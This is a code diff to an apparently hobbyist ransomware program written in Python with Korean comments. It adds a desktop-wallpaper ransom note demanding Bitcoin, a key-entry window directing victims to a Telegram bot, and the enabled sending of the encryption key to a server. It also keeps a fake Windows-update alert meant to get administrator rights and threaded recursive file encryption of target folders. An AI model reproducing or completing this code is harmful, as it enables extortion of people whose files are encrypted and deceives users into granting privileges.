@@ -9,6 +9,8 @@ from threading import Thread
 import threading
 import time
 from multiprocessing import Process
+from PIL import Image, ImageDraw, ImageFont
+from tkinter import Label, Entry
 
 #0. 기본 환경설정
 #asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
@@ -170,7 +172,7 @@ def listUpTargetDir():
     #        PathList.append(drive)
     #PathList.remove("c:\\")
     #print(f"[DEBUG] PathList: {PathList}")
-    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test"]#테스트용 타겟 경로
+    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\StarCraft"]#테스트용 타겟 경로"E:\\github\\-ransomware\\최지웅\\test"
 
 def recursiveEncrypt(basepath):
     global ThreadPool
@@ -184,7 +186,7 @@ def recursiveEncrypt(basepath):
             dirs.append(absolutePath)
 
     if (len(files)>0):
-        th=Process(target=EnDecryptor(files, EncryptModule).encryptFile())
+        th=Thread(target=EnDecryptor(files, EncryptModule).encryptFile())
         ThreadPool.append(th)
         th.start()
         #EnDecryptor(files, EncryptModule).encryptFile()
@@ -202,7 +204,7 @@ def recursiveDecrypt(basepath):
             dirs.append(absolutePath)
 
     if (len(files)>0):
-        th=Process(target=EnDecryptor(files, EncryptModule).decryptFile())
+        th=Thread(target=EnDecryptor(files, EncryptModule).decryptFile())
         ThreadPool.append(th)
         th.start()
         #EnDecryptor(files, EncryptModule).decryptFile()
@@ -219,6 +221,62 @@ def fakeAlert():#관리자 권한 실행 유도
     WINDOW=tkinter.Tk()
     WINDOW.withdraw()
     messagebox.showerror("Windows 업데이트 작업 중...", "컴퓨터를 끄지 마십시오")
+
+#암호화 경고
+def changeBackground():
+    try:        # Run Try/Except So We Dont Run in to Error
+        Img = Image.new('RGB', (GetSystemMetrics(0), GetSystemMetrics(1)), color = (0, 0, 0))   # Getting Window Heihgt & Weight To Make Background
+
+        Canvas= ImageDraw.Draw(Img)                                                             # Drawing Image
+        font = ImageFont.truetype("arial", int(GetSystemMetrics(1)/20))                         # Getting Right Font Size          
+        Canvas.text(
+            (10,10), (r"""
+                Your data Is encrypted  In order to Get your
+                    > date back Send me (YOUR PRICE USD) in BTC to this Wellt
+                    > and then email me for your key
+                    > YOUR WELLET
+                    > GoodLuck :)
+                    > ~ YOUR NAME """), 
+                fill=(255,0,0),font=font)                                                       # Write Text On Image                                                        
+        Img.save('Bg.png')                                                                      # Save Image as bg.png
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\Bg.png' , 0)         # Set New Background Up
+
+    except:
+        pass
+
+#복호화
+def decryptComputer(AESKey): #여기서 프로그램 분리시켜야할듯. 현재 이미 AES가 있음.
+    for drive in PathList_DEBUG:
+        print('[DEBUG] 복호화 시작')
+        start=time.time()
+        recursiveDecrypt(drive)#암호화 수행
+        while (len(ThreadPool)!=0):
+            th=ThreadPool.pop()
+            th.join()
+            print("[DEBUG] join")
+        end=time.time()
+        print("[DEBUG] 복호화 완료_ 암호화 시간", end-start,' seconds')
+    
+    
+def ransomewareWarning():
+    WINDOW=tkinter.Tk()
+    WINDOW.title('Ransomware Warning')
+    WINDOW.geometry('300x100')
+    WINDOW.resizable(False, False)
+
+    lab=Label(WINDOW)
+    lab['text']='Input Key for Decryption: '
+    lab.pack()
+    entry=Entry(WINDOW)
+    entry.bind('<Return>', decryptComputer(entry.get()))
+    entry.pack()
+    lab2=Label(WINDOW)
+    lab2['text']='If you turn off this window, You cannot get back your computer:)'
+    lab2.pack()
+    lab3=Label(WINDOW)
+    lab3['text']='Send Message to @rans_key_bot by using telegram'
+    lab3.pack()
+    WINDOW.mainloop()
             
     
 if __name__=='__main__':
@@ -228,14 +286,14 @@ if __name__=='__main__':
     print()
     encrypted_aes_key=encryptAES()
     print()
-    #sendKeyToServer(encrypted_aes_key)
+    sendKeyToServer(encrypted_aes_key)
     print()
     setEncryptModule()
     listUpTargetDir()
 
     if(IsAdmin==False):#디버그를 위한 강제실행
         #changeBackground()
-        task_thread = threading.Thread(target=fakeAlert)
+        task_thread = threading.Thread(target=fakeAlert) # 후에 꺼지게 해야함.
         #task_thread.start()
         for drive in PathList_DEBUG:
             print("\n[DEBUG] ==============================================================================")
@@ -251,18 +309,16 @@ if __name__=='__main__':
                 th.join()
                 print("[DEBUG] join")
             print("[DEBUG] 암호화 완료_ 암호화 시간", end-start,' seconds')
-            print('[DEBUG] 복호화 시작')
-            start=time.time()
-            recursiveDecrypt(drive)#암호화 수행
-            while (len(ThreadPool)!=0):
-                th=ThreadPool.pop()
-                th.join()
-                print("[DEBUG] join")
-            end=time.time()
-            print("[DEBUG] 복호화 완료_ 암호화 시간", end-start,' seconds')
-            
+
+            #changeBackgound()
+
+            #경고창 실행
+            os.system('"./Client_after_enc.py"')# 이후 분리프로그램 실행_엥 직므 안됨.
+            print('[DEBUG] END')
+            sleep(5)
+            exit(0)
             
     else:
-        fakeAlert()
+        fakeAdmin()
     
     print('hello')
